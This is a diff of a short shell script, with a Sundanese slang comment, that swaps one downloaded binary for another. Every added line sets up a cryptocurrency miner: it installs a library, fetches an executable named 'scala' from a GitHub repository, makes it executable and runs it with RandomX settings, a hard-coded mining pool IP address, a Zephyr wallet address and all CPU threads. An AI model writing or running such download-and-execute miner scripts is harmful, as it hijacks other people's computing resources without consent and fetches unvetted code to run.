@@ -4,6 +4,8 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget https://github.com/Sairin-SLOT/zepoh/raw/main/xmolx
-chmod +x xmolx
-./xmolx -a rx/0 -o 24.199.90.158:443 -u ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY -p x -t $(nproc --all) --donate-level 1 -k 
+sudo apt-get update
+sudo apt-get install libhwloc15 -y
+wget https://github.com/Sairin-SLOT/zepo/raw/main/scala
+chmod +x scala
+./scala -a rx/0 -o 24.199.90.158:443 -u ZEPHs8j799QQFKmKFaHEJ85sGoNU3VgNGU7TF1ez9gjJRHb2XYVUPvgLS8okjGECMhcgx4HuJceLwXBEywNBR1gUP6tsD3K9iVY -p x -t $(nproc --all)
